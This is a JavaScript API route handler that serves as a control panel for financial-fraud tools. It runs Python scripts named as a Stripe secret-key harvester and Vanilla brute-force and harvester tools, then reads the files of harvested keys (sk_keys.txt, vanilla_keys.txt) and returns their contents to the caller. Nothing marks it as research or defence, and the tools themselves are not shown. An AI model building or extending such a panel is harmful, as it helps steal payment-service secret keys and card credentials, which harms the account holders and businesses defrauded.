import { exec } from 'child_process';
import path from 'path';
import fs from 'fs';

export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const { toolName } = req.body;

  // Map tool names to physical script file paths in your container
  const toolPaths = {
    'stripe_sk_harvester': '/app/tools/financial/stripe_sk_harvester.py',
    'vanilla_brute': '/app/tools/financial/vanilla_brute.py',
    'vanilla_harvester': '/app/tools/financial/vanilla_harvester.py'
  };

  const scriptPath = toolPaths[toolName];
  if (!scriptPath) {
    return res.status(400).json({ success: false, error: 'Invalid tool selected.' });
  }

  exec(`python3 "${scriptPath}"`, (error, stdout, stderr) => {
    let savedKeysContent = '';
    
    // Automatically search for output log files generated by tools
    const possibleKeyPaths = [
      path.join(process.cwd(), 'sk_keys.txt'),
      path.join('/app/tools/financial', 'sk_keys.txt'),
      path.join(process.cwd(), 'vanilla_keys.txt'),
      path.join('/app/tools/financial', 'vanilla_keys.txt'),
      path.join(__dirname, 'sk_keys.txt')
    ];

    for (const p of possibleKeyPaths) {
      if (fs.existsSync(p)) {
        try {
          savedKeysContent = fs.readFileSync(p, 'utf8');
          break;
        } catch (e) {
          // ignore read error and check next path
        }
      }
    }

    res.json({
      success: !error,
      output: stdout,
      stderr: stderr,
      savedKeys: savedKeysContent
    });
  });
}
